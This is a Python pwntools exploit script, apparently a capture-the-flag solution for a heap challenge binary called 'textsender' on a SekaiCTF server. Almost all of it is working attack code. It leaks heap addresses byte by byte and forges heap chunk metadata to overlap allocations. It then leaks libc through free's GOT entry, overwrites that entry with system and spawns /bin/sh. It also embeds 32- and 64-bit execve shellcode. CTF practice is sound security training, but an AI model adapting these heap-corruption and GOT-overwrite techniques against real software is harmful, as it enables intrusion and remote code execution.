from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './textsender'
HOST = 'chals.sekai.team'
PORT =  4000

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))
_32_SHELLCODE = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
_64_SHELLCODE = b"\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

r = start()
if args.D:
	debug(r, [0x24ec])

def set_sender(name):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', name) #0x6f
def add_ms(name, ms):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', name) #0x78
    r.sendlineafter(b': ', ms) #0x1f8
def edit_ms(name, ms):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b': ', name) #inf?
    ret = r.recvuntil(b'\n')
    if b'Old' not in ret:
        return False
    r.sendlineafter(b': ', ms) #0x1f8
    return True

def pall():
    r.sendlineafter(b'> ', b'4')
def sall():
    r.sendlineafter(b'> ', b'5')

add_ms(b'1'*8, b'1'*0x1f7)
add_ms(b'2'*8, b'2'*0x1f7)
sall()
add_ms(b'3'*8, b'3')
add_ms(b'4'*8, b'4')

payload = b''
payload += b'4'*8
payload += b'\x00' * 0x68
payload += flat(0, 0x201, 0x34, 0)
payload += b'\x31' * 0x1e0
payload += flat(0x0031313131313131, 0x21)

leak = b'\xc0'
while len(leak) < 8:
    for i in range(0x100):
        if i == 0xa:
            continue

        f = edit_ms(payload+leak+i.to_bytes(1, 'little'), b'4')
        if f == True:
            leak += i.to_bytes(1, 'little')
            break
    pp = u64(leak.ljust(8, b'\x00'))
    dbg('pp')

leak = u64(leak)
dbg('leak')
heap = leak - 0x5c0
dbg('heap')
#context.log_level = 'debug'

#r.interactive()
#exit()

sall()
add_ms(b'x'*0x8, b'1'*0x1f7)

add_ms(b'1'*8, b'1'*0x1f7)
add_ms(b'2'*8, b'2'*0x1f7)
add_ms(b'3'*8, b'3'*0x1f7)
add_ms(b'4'*8, b'4'*0x1f7)
add_ms(b'5'*8, b'5'*0x1f7)
add_ms(b'6'*8, b'6'*0x1b0+flat(0, 0x21, heap+0x2fe0, heap+0x2fe0, 0, 0xc1, heap+0x2fc0, heap+0x2fc0))
payload = b''
payload += flat(0, 0, 0, 0x61, 0xdead, 0xbeef)
payload = payload.ljust(0x70, b'\xcd')
payload += p64(0xc0)
add_ms(payload, b'1'*0x1f7)

set_sender(b'A'*0x6f)
sall()

add_ms(b'1'*8, b'1'*0x10)
add_ms(b'2'*8, b'2'*0x10)
add_ms(b'3'*8, b'3'*0x10)
add_ms(b'4'*8, b'4'*0x10)
add_ms(b'5'*8, b'5'*0x10)
add_ms(b'6'*8, b'6'*0x10)
add_ms(b'7'*8, b'7'*0x10)

add_ms(b'8'*8, b'8'*0x10)
edit_ms(b'8'*8, flat(0x1111, 0x2222, 0x3333, 0x21, heap+0x3030, elf.got.free))

pall()
r.recvuntil(b'88888888: ')
leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
dbg('leak')
base = leak-0x8cef0
dbg('base')
system = base + 0x4af30
edit_ms(b'8'*8, p64(system))

r.sendlineafter(b'> ', b'3')
r.sendlineafter(b': ', b'/bin/sh;')

r.interactive()
r.close()
